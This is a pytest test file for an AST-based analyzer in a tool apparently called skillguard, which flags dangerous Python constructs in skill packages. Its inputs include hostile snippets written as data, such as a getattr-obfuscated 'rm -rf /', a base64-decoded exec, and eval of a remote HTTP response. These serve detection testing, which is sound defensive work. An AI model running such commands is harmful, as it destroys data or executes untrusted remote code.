"""structural Python analysis with the AST."""

from __future__ import annotations

from skillguard.models import Component, ScanContext
from skillguard.nodes.analyzers.behavioral_ast import analyze_python, behavioral_ast
from skillguard.state import ScanState


def _context(source: str, *, path: str = "scripts/x.py", kind: str = "python") -> ScanContext:
    return ScanContext(
        skill_path="/x",
        components=[Component(path=path, type=kind, executable=kind == "python")],
        file_cache={path: source},
    )


def _ids(source: str) -> list[str]:
    return sorted(finding.rule_id for finding in analyze_python(_context(source)))


def test_exec_is_critical() -> None:
    findings = analyze_python(_context('exec("print(1)")'))

    assert [f.rule_id for f in findings] == ["AST1"]
    assert findings[0].severity.value == "CRITICAL"


def test_eval_is_high() -> None:
    assert _ids("eval('1 + 1')") == ["AST2"]


def test_dynamic_import_only_when_the_name_is_not_literal() -> None:
    assert _ids("module = 'os'\n__import__(module)\n") == ["AST3"]
    assert "AST3" not in _ids('__import__("os")\n')


def test_plain_subprocess_run_yields_exactly_one_ast4() -> None:
    assert _ids("import subprocess\nsubprocess.run(['ls'])\n") == ["AST4"]


def test_shell_true_adds_tm1() -> None:
    assert _ids("import subprocess\nsubprocess.run('ls', shell=True)\n") == ["AST4", "TM1"]


def test_os_system_is_ast5() -> None:
    assert _ids("import os\nos.system('ls')\n") == ["AST5"]


def test_os_exec_family_is_ast5() -> None:
    assert _ids("import os\nos.execvp('/bin/sh', ['sh'])\n") == ["AST5"]


def test_compile_is_ast6() -> None:
    assert _ids("compile('1+1', '<s>', 'eval')") == ["AST6"]


def test_getattr_evasion_yields_ast5_and_ast7() -> None:
    assert _ids('import os\ngetattr(os, "system")("rm -rf /")\n') == ["AST5", "AST7"]


def test_getattr_assigned_to_a_variable_is_ast7() -> None:
    assert "AST7" in _ids('import os\nf = getattr(os, "system")\n')


def test_getattr_with_a_harmless_literal_is_ignored() -> None:
    source = 'class Obj:\n    name = "x"\n\nobj = Obj()\ngetattr(obj, "name")\n'
    assert _ids(source) == []


def test_getattr_with_a_computed_name_is_ast7() -> None:
    assert "AST7" in _ids("import os\nname = 'system'\ngetattr(os, name)\n")


def test_exec_of_base64_is_ast1_and_ast8() -> None:
    source = 'import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n'
    assert _ids(source) == ["AST1", "AST8"]


def test_eval_of_a_remote_response_is_ast8() -> None:
    source = "import requests\neval(requests.get('https://x').text)\n"
    assert _ids(source) == ["AST2", "AST8"]


def test_syntax_error_is_skipped_not_fatal() -> None:
    assert analyze_python(_context("def broken(:\n")) == []


def test_non_python_files_are_not_ast_scanned() -> None:
    assert analyze_python(_context('exec("x")', path="SKILL.md", kind="markdown")) == []


def test_benign_python_has_no_findings() -> None:
    source = "import json\n\n\ndef load(text: str) -> dict:\n    return json.loads(text)\n"
    assert analyze_python(_context(source)) == []


def test_ast_findings_are_high_confidence() -> None:
    findings = analyze_python(_context('exec("x")'))

    assert all(finding.confidence == 0.95 for finding in findings)


def test_node_wraps_analyze_python() -> None:
    update = behavioral_ast(ScanState(context=_context('exec("x")')))
    findings = update["findings"]

    assert isinstance(findings, list)
    assert [f.rule_id for f in findings] == ["AST1"]
